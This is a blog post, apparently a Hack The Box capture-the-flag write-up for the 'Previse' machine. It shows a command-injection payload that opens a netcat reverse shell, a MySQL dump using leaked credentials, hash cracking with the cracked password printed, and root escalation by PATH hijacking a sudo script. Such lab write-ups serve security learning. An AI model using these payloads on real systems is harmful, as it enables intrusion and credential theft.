<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>üì¶ HTB - Previse | 0xNinja - My blog</title><meta name=keywords content="htb,writeup"><meta name=description content="TL;DR Bypass PHP redirect to access restricted page, create low priv web account, get website backup. Audit code and find OS command injection + MySQL creds, get reverse shell and dump database, get password hash and crack it to SSH. Privesc via path injection.
Footholds nmap gives us only ports 22 and 80.
We first get this website:
Nothing we can deal with here, no SQL injection :(
For more info I used dirsearch to fuzz the web pages, and it found the following:"><meta name=author content="0xNinja"><link rel=canonical href=https://0xninja.fr/posts/htb-previse/><link crossorigin=anonymous href=/assets/css/stylesheet.min.fcb2dfef1f861f508726aa63fad2809727c9d99081a63847ab71ee83ce0d1203.css integrity="sha256-/LLf7x+GH1CHJqpj+tKAlyfJ2ZCBpjhHq3Hug84NEgM=" rel="preload stylesheet" as=style><link rel=icon href=https://0xninja.fr/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://0xninja.fr/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://0xninja.fr/favicon-32x32.png><link rel=apple-touch-icon href=https://0xninja.fr/apple-touch-icon.png><link rel=mask-icon href=https://0xninja.fr/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.98.0"><meta property="og:title" content="üì¶ HTB - Previse"><meta property="og:description" content="TL;DR Bypass PHP redirect to access restricted page, create low priv web account, get website backup. Audit code and find OS command injection + MySQL creds, get reverse shell and dump database, get password hash and crack it to SSH. Privesc via path injection.
Footholds nmap gives us only ports 22 and 80.
We first get this website:
Nothing we can deal with here, no SQL injection :(
For more info I used dirsearch to fuzz the web pages, and it found the following:"><meta property="og:type" content="article"><meta property="og:url" content="https://0xninja.fr/posts/htb-previse/"><meta property="og:image" content="https://0xninja.fr/box.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-11T13:00:00+00:00"><meta property="article:modified_time" content="2021-08-11T13:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0xninja.fr/box.png"><meta name=twitter:title content="üì¶ HTB - Previse"><meta name=twitter:description content="TL;DR Bypass PHP redirect to access restricted page, create low priv web account, get website backup. Audit code and find OS command injection + MySQL creds, get reverse shell and dump database, get password hash and crack it to SSH. Privesc via path injection.
Footholds nmap gives us only ports 22 and 80.
We first get this website:
Nothing we can deal with here, no SQL injection :(
For more info I used dirsearch to fuzz the web pages, and it found the following:"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://0xninja.fr/posts/"},{"@type":"ListItem","position":3,"name":"üì¶ HTB - Previse","item":"https://0xninja.fr/posts/htb-previse/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"üì¶ HTB - Previse","name":"üì¶ HTB - Previse","description":"TL;DR Bypass PHP redirect to access restricted page, create low priv web account, get website backup. Audit code and find OS command injection + MySQL creds, get reverse shell and dump database, get password hash and crack it to SSH. Privesc via path injection.\nFootholds nmap gives us only ports 22 and 80.\nWe first get this website:\nNothing we can deal with here, no SQL injection :(\nFor more info I used dirsearch to fuzz the web pages, and it found the following:","keywords":["htb","writeup"],"articleBody":"TL;DR Bypass PHP redirect to access restricted page, create low priv web account, get website backup. Audit code and find OS command injection + MySQL creds, get reverse shell and dump database, get password hash and crack it to SSH. Privesc via path injection.\nFootholds nmap gives us only ports 22 and 80.\nWe first get this website:\nNothing we can deal with here, no SQL injection :(\nFor more info I used dirsearch to fuzz the web pages, and it found the following:\n/accounts.php /download.php /files.php /login.php /logout.php /logs.php /status.php User All with 302 Found HTTP code, with a redirect towards /login.php. With that much info we want to get the content of those pages. To do so I used BurpSuite and made a filter to replace HTTP/1.1 302 Found with HTTP/1.1 200 which worked like a charm, but using only curl would also work.\nWe now have access to the previous pages. In order to download a file you must have a valid PHPSESSID, so you want to create your own user on /accounts.php. Log in again with your fresh accounts and you can access to the siteBacku.zip file at /files.php.\nIn this backup we have multiple files, including a nice config.php containing MySQL credentials; we will use it in a minute. We also have the code for the whole webapp. One file caught my attention:\n1 2 3 4 5 6 7 8 9 10 11  // logs.php [...]  ///////////////////////////////////////////////////////////////////////////////////// //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER// /////////////////////////////////////////////////////////////////////////////////////  $output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\"); echo $output;  [...]   Whatever this means, there is no filter at all for this $_POST['delim'] variable, therefor we can easily inject some command here. As confidant as always I open a netcat listener on my machine, and inject my payload like so:\n1  curl -X POST previse.htb/logs.php -b 'PHPSESSID=MY_VALID_SESSION' -d 'delim=;nc IP PORT -e /bin/sh'   As expected I got my reverse shell üéâ\nLet‚Äôs upgrade from this poor virgin netcat to a chad upgrade:\n1 2 3 4 5 6 7 8 9  # on reverse shell python -c 'import pty; pty.spawn(\"/bin/bash\")' (www-data@previse.htb) /var/www/html/: ^Z # Ctrl-Z to background  # on main host ~/ctf/htb/previse  stty raw -echo; fg  (www-data@previse.htb) /var/www/html/:   We now have a better shell, with history and completion. Time to get user!\nWith the previous info we can directly dump the database:\n1  mysql -u root -p 'mySQL_p@ssw0rd!:)' -D previse -e 'select * from accounts;'   Like so we get a password hash for an another user: m4lwhere:$1$üßÇllol$DQpmdvnb7EeuO6UaqRItf., we crack it using hashcat because john did not worked:\n1 2 3 4  hashcat -m 500 user_hash /usr/share/wordlist/rockyou.txt # wait for about 15 minutes...  $1$üßÇllol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!   We can SSH on the box.\nRoot (m4lwhere@previse.htb): sudo -l (root) /opt/scripts/access_backups.sh 1 2 3  # /opt/scripts/access_backup.sh  gzip -c /var/www/apache_logs.gz ...   The path for the access_backup.sh is absolute, but not for gzip in the script. We can then create our own gzip executable which will run with root rights:\n1 2 3  # /tmp/gzip #!/bin/sh cat /root/root.txt  /tmp/root   We change our path with export PATH=\"/tmp/:$PATH\" and execute the script with sudo:\ncd /tmp; sudo /opt/scripts/access_logs.sh\n","wordCount":"528","inLanguage":"en","image":"https://0xninja.fr/box.png","datePublished":"2021-08-11T13:00:00Z","dateModified":"2021-08-11T13:00:00Z","author":{"@type":"Person","name":"0xNinja"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://0xninja.fr/posts/htb-previse/"},"publisher":{"@type":"Organization","name":"0xNinja - My blog","logo":{"@type":"ImageObject","url":"https://0xninja.fr/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://0xninja.fr accesskey=h title="0xNinja - My blog (Alt + H)">0xNinja - My blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://0xninja.fr/about/ title="ü•∑ About"><span>ü•∑ About</span></a></li><li><a href=https://0xninja.fr/archives/ title="üìù Archives"><span>üìù Archives</span></a></li><li><a href=https://0xninja.fr/tags/ title="üè∑Ô∏è Tags"><span>üè∑Ô∏è Tags</span></a></li><li><a href=https://0xninja.fr/projects/ title="üî¨ Projects"><span>üî¨ Projects</span></a></li><li><a href=https://0xninja.fr/search/ title="üîé Search (Alt + /)" accesskey=/><span>üîé Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://0xninja.fr>Home</a>&nbsp;¬ª&nbsp;<a href=https://0xninja.fr/posts/>Posts</a></div><h1 class=post-title>üì¶ HTB - Previse</h1><div class=post-meta>August 11, 2021&nbsp;¬∑&nbsp;3 min&nbsp;¬∑&nbsp;0xNinja</div></header><figure class=entry-cover><img loading=lazy srcset="https://0xninja.fr/posts/htb-previse/box_hue559bffb5c5559ac38736f3a3727cd7a_34917_360x0_resize_box_3.png 360w ,https://0xninja.fr/posts/htb-previse/box_hue559bffb5c5559ac38736f3a3727cd7a_34917_480x0_resize_box_3.png 480w ,https://0xninja.fr/posts/htb-previse/box_hue559bffb5c5559ac38736f3a3727cd7a_34917_720x0_resize_box_3.png 720w ,https://0xninja.fr/posts/htb-previse/box.png 751w" sizes="(min-width: 768px) 720px, 100vw" src=https://0xninja.fr/posts/htb-previse/box.png alt></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><li><a href=#tldr aria-label=TL;DR>TL;DR</a></li><li><a href=#footholds aria-label=Footholds>Footholds</a></li><li><a href=#user aria-label=User>User</a></li><li><a href=#root aria-label=Root>Root</a></li></ul></div></details></div><div class=post-content><h2 id=tldr>TL;DR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><p>Bypass PHP redirect to access restricted page, create low priv web account, get website backup. Audit code and find OS command injection + MySQL creds, get reverse shell and dump database, get password hash and crack it to SSH. Privesc via path injection.</p><h2 id=footholds>Footholds<a hidden class=anchor aria-hidden=true href=#footholds>#</a></h2><p><code>nmap</code> gives us only ports <code>22</code> and <code>80</code>.</p><p>We first get this website:</p><p><img loading=lazy src=index.png alt=index></p><p>Nothing we can deal with here, no SQL injection :(</p><p><img loading=lazy src=login_failed.png alt=login></p><p>For more info I used <code>dirsearch</code> to fuzz the web pages, and it found the following:</p><pre tabindex=0><code>/accounts.php
/download.php
/files.php
/login.php
/logout.php
/logs.php
/status.php
</code></pre><h2 id=user>User<a hidden class=anchor aria-hidden=true href=#user>#</a></h2><p>All with <code>302 Found</code> HTTP code, with a redirect towards <code>/login.php</code>. With that much info we want to get the content of those pages. To do so I used BurpSuite and made a filter to replace <code>HTTP/1.1 302 Found</code> with <code>HTTP/1.1 200</code> which worked like a charm, but using only <code>curl</code> would also work.</p><p>We now have access to the previous pages. In order to download a file you must have a valid <code>PHPSESSID</code>, so you want to create your own user on <code>/accounts.php</code>. Log in again with your fresh accounts and you can access to the <code>siteBacku.zip</code> file at <code>/files.php</code>.</p><p>In this backup we have multiple files, including a nice <code>config.php</code> containing MySQL credentials; we will use it in a minute. We also have the code for the whole webapp. One file caught my attention:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// logs.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>[<span style=color:#f92672>...</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/////////////////////////////////////////////////////////////////////////////////////
</span></span></span><span style=display:flex><span><span style=color:#75715e>//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
</span></span></span><span style=display:flex><span><span style=color:#75715e>/////////////////////////////////////////////////////////////////////////////////////
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style=color:#e6db74>{</span>$_POST[<span style=color:#e6db74>&#39;delim&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $output;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>...</span>]
</span></span></code></pre></td></tr></table></div></div><p>Whatever this means, there is no filter at all for this <code>$_POST['delim']</code> variable, therefor we can easily inject some command here. As confidant as always I open a netcat listener on my machine, and inject my payload like so:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl -X POST previse.htb/logs.php -b <span style=color:#e6db74>&#39;PHPSESSID=MY_VALID_SESSION&#39;</span> -d <span style=color:#e6db74>&#39;delim=;nc IP PORT -e /bin/sh&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>As expected I got my reverse shell üéâ</p><p>Let&rsquo;s upgrade from this poor virgin netcat to a chad upgrade:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e># on reverse shell</span>
</span></span><span style=display:flex><span>python -c <span style=color:#e6db74>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>www-data@previse.htb<span style=color:#f92672>)</span> /var/www/html/: ^Z <span style=color:#75715e># Ctrl-Z to background</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># on main host</span>
</span></span><span style=display:flex><span>~/ctf/htb/previse
</span></span><span style=display:flex><span>&gt; stty raw -echo; fg
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>www-data@previse.htb<span style=color:#f92672>)</span> /var/www/html/:
</span></span></code></pre></td></tr></table></div></div><p>We now have a better shell, with history and completion. Time to get user!</p><p>With the previous info we can directly dump the database:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>mysql -u root -p <span style=color:#e6db74>&#39;mySQL_p@ssw0rd!:)&#39;</span> -D previse -e <span style=color:#e6db74>&#39;select * from accounts;&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Like so we get a password hash for an another user: <code>m4lwhere:$1$üßÇllol$DQpmdvnb7EeuO6UaqRItf.</code>, we crack it using <code>hashcat</code> because <code>john</code> did not worked:</p><p><img loading=lazy src=hash_crack.png alt=hash></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>hashcat -m <span style=color:#ae81ff>500</span> user_hash /usr/share/wordlist/rockyou.txt
</span></span><span style=display:flex><span><span style=color:#75715e># wait for about 15 minutes...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$1$üßÇllol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
</span></span></code></pre></td></tr></table></div></div><p>We can SSH on the box.</p><h2 id=root>Root<a hidden class=anchor aria-hidden=true href=#root>#</a></h2><pre tabindex=0><code>(m4lwhere@previse.htb): sudo -l

(root) /opt/scripts/access_backups.sh
</code></pre><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e># /opt/scripts/access_backup.sh</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gzip -c /var/www/apache_logs.gz ...
</span></span></code></pre></td></tr></table></div></div><p>The path for the <code>access_backup.sh</code> is absolute, but not for <code>gzip</code> in the script. We can then create our own <code>gzip</code> executable which will run with <code>root</code> rights:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e># /tmp/gzip</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/sh</span>
</span></span><span style=display:flex><span>cat /root/root.txt &gt; /tmp/root
</span></span></code></pre></td></tr></table></div></div><p>We change our path with <code>export PATH="/tmp/:$PATH"</code> and execute the script with sudo:</p><p><code>cd /tmp; sudo /opt/scripts/access_logs.sh</code></p><p><img loading=lazy src=rooted.png alt=Rooted></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://0xninja.fr/tags/htb/>htb</a></li><li><a href=https://0xninja.fr/tags/writeup/>writeup</a></li></ul><nav class=paginav><a class=prev href=https://0xninja.fr/posts/install-archlinux/><span class=title>¬´ Prev Page</span><br><span>How to install Archlinux</span></a>
<a class=next href=https://0xninja.fr/posts/htb-schooled/><span class=title>Next Page ¬ª</span><br><span>üì¶ HTB - Schooled</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://0xninja.fr>0xNinja - My blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>